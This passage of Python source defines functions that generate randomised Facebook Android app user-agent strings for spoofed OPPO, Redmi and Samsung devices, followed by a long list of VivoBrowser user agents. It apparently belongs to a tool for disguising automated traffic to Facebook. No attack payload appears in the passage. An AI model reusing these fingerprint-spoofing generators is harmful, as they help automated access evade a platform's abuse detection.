    ua = f'Dalvik/2.1.0 (Linux; U; Android '+str(random.randint(4,13))+'.0.1; '+realme+' Build/'+e+') [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+str(random.randint(000000000,999999999))+';FBCR/Jio 4G;FBMF/realme;FBBD/realme;FBDV/'+realme+';FBSV/'+str(random.randint(4,13))+'.0.1;FBCA/'+fbcax+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
    return ua
def m4file():
    fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(11, 99)}'
    b = f'{random.randint(111111,999999)}.{random.randint(111,999)}'
    d = '{density=2.0,width=720,height=1280}'
    cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853','CPH2127', 'CPH2131','PDVM00','CPH2095','CPH2119','PEAT00', 'PEAM00','CPH2137','CPH2125','CPH2065','CPH2121', 'CPH2123','CPH2099','CPH2139', 'CPH2135','CPH2185','SPH2209','CPH2161','PERM00','CPH2109','CPH2113','PDYM20', 'PDYT20','PDNM00', 'PDNT00', 'CPH2089'])
    ua = f'Dalvik/2.1.0 (Linux; U; Android {str(random.randint(4,13))}.0.1; {cph} Build/QP1A {b}) [FBAN/FB4A;FBAV/{fbav};FBBV/{str(random.randint(000000000,999999999))};FBDM/{d};FBLC/en_US;FBRV/0;FBCR/Jio 4G;FBMF/OPPO;FBBD/OPPO;FBPN/com.facebook.katana;FBDV/{cph};FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    return ua
def m5file():
    redmi_models = ["Redmi Note 11","Redmi 10","Redmi K40","Redmi 9","Redmi Note 10","Redmi 8","Redmi Note 9 Pro","Redmi 7","Redmi Note 8 Pro","Redmi 6A","Redmi Note 8"]
    samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V','GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H','GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V','SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'SAMSUNG|SM-T280','SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M','SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SAMSUNG|SM-N920S','SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G','SM-J320F|LMY47V', 'SAMSUNG|SM-G532F', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H','SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H','SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K','SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V','SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4','SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'SAMSUNG|SM-A500F', 'SM-T561|KTU84P','SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K','SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P','GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SAMSUNG|SM-J320F','SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G','SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H','SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H','SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V','SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G','SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P','SAMSUNG|SM-G532F', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H','SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'SAMSUNG|SM-G920F','SAMSUNG|SM-J510FN', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V','SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H','GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M','SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'SAMSUNG|SM-J320F']
    model, build = random.choice(samsung).split('|')
    fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(11, 99)}'
    b = f'{random.randint(111111,999999)}.{random.randint(111,999)}'
    modx = random.choice(redmi_models)
    ua = f'Dalvik/2.1.0 (Linux; U; Android '+str(random.randint(4,13))+'.0.1; '+modx+' Build/QP1A'+b+') [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+str(random.randint(000000000,999999999))+';FBCR/Jio 4G;FBMF/Samsung;FBBD/Samsung;FBDV/'+model+';FBSV/'+str(random.randint(4,13))+'.0.1;FBCA/'+fbcax+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
    return ua
lwm = '''Mozilla/5.0 (Linux; Android 8.1.0; vivo Y83A Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/8.2.10.0
Mozilla/5.0 (Linux; Android 10; vivo 1806; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1919; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 10; vivo 1935; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1811 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 12; I2011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1915; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 9; vivo 1723 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1724 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1906; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1818; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 10; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 10; vivo 1938; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 10; vivo 2015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1812 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.0
Mozilla/5.0 (Linux; Android 12; V2130; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 7.0; vivo 1713 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 9; vivo 1916 Build/PKQ1.190626.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.1
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1817 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.0
Mozilla/5.0 (Linux; Android 11; V2102; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 10; V2032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1802 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 2018; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 12; V2110; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 9; vivo 1906 Build/PKQ1.190616.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1906; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; V2109; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 12; V2108; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.0
Mozilla/5.0 (Linux; Android 11; V2149; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; V2026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 10; vivo 2019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 2007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; V2111; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 12; V2110; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; V2068; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1918; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; V2116; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1814 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1929; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.0
Mozilla/5.0 (Linux; Android 11; vivo 1906; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36 VivoBrowser/8.2.0.0 Chrome/87.0.4280.141
Mozilla/5.0 (Linux; Android 11; vivo 1915; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1815 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1816 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.1
Mozilla/5.0 (Linux; Android 12; V2041; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; vivo 1919; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1726 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 2015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1917; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; V2030; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 12; V2038; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.4
Mozilla/5.0 (Linux; Android 11; V2109; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 10; vivo 1935; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.2
Mozilla/5.0 (Linux; Android 11; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3
Mozilla/5.0 (Linux; Android 12; V2055; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.1
Mozilla/5.0 (Linux; Android 12; V2130; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.3
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1716 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.2
Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1920; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 9; vivo 1727 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1727 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1915; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 10; vivo 1806; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; V2039; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1819; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 11; vivo 1907; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.3
Mozilla/5.0 (Linux; Android 11; V2111; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 12; V2031; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1804; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1935; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 10; V2029; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; vivo 1906; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.4
Mozilla/5.0 (Linux; Android 11; vivo 1901; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1801 Build/OPM1.171019.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1803 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1808 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.0
Mozilla/5.0 (Linux; Android 8.1.0; vivo 1820 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.2
Mozilla/5.0 (Linux; Android 10; vivo 2015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 11; vivo 1904; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 9; vivo 1915 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; vivo 1938; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
Mozilla/5.0 (Linux; Android 10; V2027; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 9; vivo 1902 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.2.1
Mozilla/5.0 (Linux; Android 9; vivo 1727 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.4.2
Mozilla/5.0 (Linux; Android 9; vivo 1723 Build/PKQ1.190118.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/87.0.4280.141 Mobile Safari/537.36 VivoBrowser/8.2.0.2
